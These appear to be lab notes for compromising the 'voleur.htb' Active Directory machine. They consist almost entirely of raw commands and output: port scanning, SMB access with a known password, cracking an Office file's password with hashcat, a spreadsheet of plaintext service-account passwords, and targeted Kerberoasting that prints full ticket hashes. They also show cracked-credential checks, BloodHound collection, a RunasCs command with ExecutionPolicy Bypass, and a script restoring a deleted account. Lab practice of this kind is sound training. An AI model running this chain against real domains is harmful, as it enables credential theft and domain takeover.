


```python
kali@kali ~/H/vol> nmap -sC -sV -Pn 10.129.198.129
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 23:56 EDT
Nmap scan report for 10.129.198.129
Host is up (0.083s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 03:58:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-06T03:58:30
|_  start_date: N/A
|_clock-skew: 1m39s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.97 seconds

```




```
kali@kali ~/H/vol> nxc smb 10.129.195.138 -u 'ryan.naylor' -p 'HollowOct31Nyt'
SMB         10.129.195.138  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.195.138  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 

kali@kali ~/H/vol [1]> nxc smb 10.129.195.138 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         10.129.195.138  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.195.138  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 

```




```
kali@kali ~/H/vol> cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.195.138.json
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "atime_epoch": "2025-01-31 04:09:27",
            "ctime_epoch": "2025-01-29 04:39:51",
            "mtime_epoch": "2025-05-29 18:23:36",
            "size": "16.5 KB"
        }
    },
    "NETLOGON": {},
    "SYSVOL": {
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2025-05-07 20:01:14",
            "ctime_epoch": "2025-01-29 03:42:28",
            "mtime_epoch": "2025-05-07 20:01:14",
            "size": "22 B"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv": {
            "atime_epoch": "2025-05-07 20:01:14",
            "ctime_epoch": "2025-05-07 20:01:02",
            "mtime_epoch": "2025-05-07 20:01:14",
            "size": "377 B"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-05-07 20:00:32",
            "ctime_epoch": "2025-01-29 03:42:28",
            "mtime_epoch": "2025-05-07 20:00:32",
            "size": "1.19 KB"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2025-01-29 03:49:11",
            "ctime_epoch": "2025-01-29 03:49:11",
            "mtime_epoch": "2025-01-29 03:49:11",
            "size": "2.72 KB"
        },
        "voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2025-01-30 08:57:03",
            "ctime_epoch": "2025-01-29 03:42:28",
            "mtime_epoch": "2025-01-30 08:57:03",
            "size": "23 B"
        },
        "voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-01-30 08:57:03",
            "ctime_epoch": "2025-01-29 03:42:28",
            "mtime_epoch": "2025-01-30 08:57:03",
            "size": "4.01 KB"
        }
    }

```




```
Host memory required for this attack: 0 MB




Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 9600 (MS Office 2013)
Hash.Target......: $office$*2013*100000*256*16*a80811402788c037b50df97...fa111c
Time.Started.....: Mon Jul  7 17:49:49 2025 (6 secs)
Time.Estimated...: Mon Jul  7 17:49:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      189 H/s (7.34ms) @ Accel:512 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 512/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: hockey -> bethany
Hardware.Mon.#1..: Util: 97%


```



```
kali@kali ~/.n/m/n/1/I/First-Line Support> cat cracked.txt 
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1

```



|User|Job Title|Permissions|Notes|
|Ryan.Naylor|First-Line Support Technician|SMB|Has Kerberos Pre-Auth disabled temporarily to test legacy systems.|
|Marie.Bryant|First-Line Support Technician|SMB||
|Lacey.Miller|Second-Line Support Technician|Remote Management Users||
|~~Todd.Wolfe~~|Second-Line Support Technician|Remote Management Users|Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.|
|Jeremy.Combs|Third-Line Support Technician|Remote Management Users.|Has access to Software folder.|
|Administrator|Administrator|Domain Admin|Not to be used for daily tasks!|
|||||
|||||
|Service Accounts||||
|svc_backup||Windows Backup|Speak to Jeremy!|
|svc_ldap||LDAP Services|P/W - M1XyC9pW7qT5Vn|
|svc_iis||IIS Administration|P/W - N5pXyW1VqM7CZ8|
|svc_winrm||Remote Management|Need to ask Lacey as she reset this recently.|



![[vol-20250707170019342.webp]]


![[vol-20250707170328281.webp]]






```python
┌──(kali㉿kali)-[~/targetedKerberoast]
└─$ faketime -f '+8h' python targetedKerberoast.py -d voleur.htb -u 'svc_ldap' -k --dc-host DC.voleur.htb --dc-ip 10.129.195.138 -v
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$932c8bf07e2636baa224a63498571890$498f4562d72549838168da288fdbd26aa23acd0377ec143a7441b80a63b70ac690c3457c1bbf9d7669e0c8fae88a0e1cd82ab1e454af50575843203a4a6420162eccf2a3431bbfcbeec31cec5c9467b8e28398b6daa622319d4c7a21e4d2eef96d6b7abc3f6a0140d6e7377623d00f97572f8a771e89b28d4bdff79bf7b0fd1aa1c6ae03367f80ca8ed8b398f2683024ee71f14c8465d48ef2501bdd89d065e185a2e071cb9b9162b80ddb9883d00e880a280e57974e5a1ab054bbf673694b5f1bb3d2588652821a59556fd682792687ae28f1f9afa10931e0b4b253befc7b8ba8010705c2751d65ef0e351c14a95e75fc8f493240b0b27595e52a1fa08cd278cf9c513b50a9727e3e3608698041c5d65d22b15f7c6cab4d3dccf68560c3cc07d6fd2b741626ba86e08176057d8ae97b723d0d6b209f3580afe5454450558a3baa58d18f32fdfcae3c6550e7010729004cb8d073fdbf6a78bc2c228db6b3124c64bea74d78729413ff93d24018ecc18c95ab20b390017498929915342a7387fe72a22046abf1a6c855387be8bde3a117c5d2df7683746df90f9d3200356181a4b4ca5c50dda8b72811b781c99b2173bf02bef3c30a24aa9d1745484a459e90567aa03105a4cb592a712fc86de80e90ffba99d22f7dcb17129074e6924384b3b98702cfcce6f6346f87a6df1a61f854eea01b6e1d3e56d5fab4a6c4cdbc0f030760cb8c422b679e65c78eb816785400e68da4b23fad504991360443d65911fe15be190a70d954141519d35cab969549a3775144ec95cf4974e1e49d8bd269ff5997efc4c912a3035699dc0fcf9864fe7f0f848b471ff5f611bf4fc72b1388c4b58811b1af68e8003e7177856a652a6b93a5a03eb69ae1c4a7371da6e936575198bfa2e0387fa358161aecf9306e48d2f995e9b9e0f817153ee4bbda4caa421af261a209a8254e9e1fa406e57e62f9ff37212c8963d314191ac6e76b5370f3995d181ab044e2f510a0205ffcac248c2228af727fe2b843e5a5fe0c52bde12193dbffa3b00ebc2f4b0d6090616a7c4e1247987e4c491ffc384d4e62e1e08f549f37b1175c9480033380857ee5df65b4ecaf13c09cbd27bd4ee18d73b4763f391c9fcab6dcf5885bf389a2ba70f59ad7be4fc8170cddf4272a3518109879318d3ce27a9ff1459e0fb8ca2703a848d5828de1d98f5ce419c6232b04978862257be485474da8e393cbf6d6b9c8295ce5e0226fd2fa5274ee5d2cbbe1f3c99d2607b6796c78388e309ddee7e9facb1fd407fb5edd9a02ad3c24b7992377ca21a857dad4f301ba381bcbe920658d844f4fd75b4124e77ffeead44bf435a6edce01ae85dab462bcf382f7b9497c559412d7564caa59ea975891f87ce26c5088d6a4d39059087792a491e803d062aaa85cf51f0fe49cdfeb2037648072c7adae437a85245d4787431d033ef805d5584a71f93cd7af3531a3
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$d2fd3efa9111dceb5154b7fee5061c7a$bb33994dd653eb882f0286ca43413e3875f60bee002139c31079df89700d3681d530ce7e9ce18df2b8addb5a38b111f955ba8d5f79b5908f1c4b30715ea760a5c9717503c6415e850c51c0da26f28d77d2d6a1ca64f40ea7b2cbf5cf0fbfea858cd6fdb0b9409eaee4cf07a26ad5d82f4bc590b0e521b021510e8900bb1afb527556f829f41d846bbd99caa91237b96f59626494478fa8db06a017985672a48dea713959b76daec2a9ae2460fa9b2557ee1c1605e34310b2f3397ff0848aadc95e1ebbcabb34634536210d4a8323fa4c3fc3f21855fb8efa1edb9db997678578f2f00db913cd574b6ab280d3f5e797eb086d7fe1c85eb23fcaecc8f6c1923c0565490e70db73ce10628bb0fae23fa4385a127cfc500e572c4a31c9cccc457e5e311fce3b5cab22a14d2528e9a09d889df883e929502174ffbe20f0c1191c29247bf44d2ed3b4e3b43cf41641d489316f5659580e106bb027e7bffb2fbf2d6ceee40f6154d852dc6f5a3f96d5bbfc295a83cfb116d06beae6e4ee89f8066ebb2b5ff3d8bb1a65d7f6e55cff5f92eb3cba0a7399df3b1108b2efe4efb46288f4b4a547ce03c8e7ecf1666e0faef726dbb2a18a68266c71ca697378a9a4930b9f385ee193479983b6e11c74892339ec3308783335fd6c59fae1aba9e0f8d91a8c714aea7bab6f30c2e467e4495680faa5507e0a4526dbf07a17290ad73fb8701bbb433b49b2a8d81dbfcc38c3f64f6d39603ea951c7a419cb24b5dc305aca049702416c4e2fd9b0c045b1bf538f5d9fd912322b490bdeb3aa986c86ebbf03553ef790c4870537a2b457f04cfa10462074cec34646d708190dd63630ba104251c7fdeed1f4fa5879b1c612e00a6b874ba0aec7d45bb6bebacf274cf237f6777bb1c5d87d482c96a71c0598bf354766182361424dadea3ab1fcf42a950314c7f25fa48999d5c4b457d90b5484bd5a464f61201789e92ca8c26d49237d006d83e7c3a728030bd16f547a932b4629c83346ec9a99e0b44d0d7319d9a72e7c8def3af1b2da854c4047cc04bdeab7b8cc312d7f10f4bf71dfd6aaa3f361ea30b84e1eb72db9015c4585a8e4c2ab74eed806d68721deb76ab03ffd19804722cab26d5407e2ccb7cc7704bec5e2b34d879871e1eb2bfd4bffe0bcf3ee4ee0dcf7b40556b4b9221b314e9bb692e03bbc7f2f0a82c0b7b12327c3a3dc628c3f5607ce1258fa3e8c342c58a7a1b5a41f1585558de83d38227315678799f87069dfd81bbf9c2735ad12e44ba7a915325358b7b47c06fedef23c07478a1348fc1d92ea4215b7c055a06da00c7b65c444c7694019e05895883f9fcdda7b853fa5e6b1be76a69e52d819afdc78c89ce7a97833db02ad75d1d5c162982edb52e26d8ae73dd47efacbaab6959612e5978d7966b0ff8dd5428f7b462966f171cc8f723d08be91c09a6addfad77b955b5c8fb1ad18f37b392e6af006b82a
[VERBOSE] SPN removed successfully for (svc_winrm)

```


```
┌──(kali㉿kali)-[~/targetedKerberoast]
└─$ faketime -f '+8h' nxc smb 10.129.195.138 -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -k
SMB         10.129.195.138  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.195.138  445    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi 

```


```
faketime -f '+8h' bloodhound-python -d voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --dns-tcp --dns-timeout 10  -ns 10.129.195.138 -c all
```



![[vol-20250707214921142.webp]]



```
Invoke-RunasCs svc_ldap M1XyC9pW7qT5Vn "powershell -ExecutionPolicy Bypass -File restore.ps1"
```



```
# Restore-Todd.ps1
try {
    Import-Module ActiveDirectory

    $deleted = Get-ADObject -Filter 'isDeleted -eq $true -and samAccountName -eq "Todd.Wolfe"' `
        -IncludeDeletedObjects -Properties *

    if ($deleted) {
        Restore-ADObject -Identity $deleted.ObjectGUID
        Write-Host "`n[+] Successfully restored Todd.Wolfe" -ForegroundColor Green
    } else {
        Write-Host "`n[-] Todd.Wolfe not found in deleted objects" -ForegroundColor Yellow
    }
}
catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}
```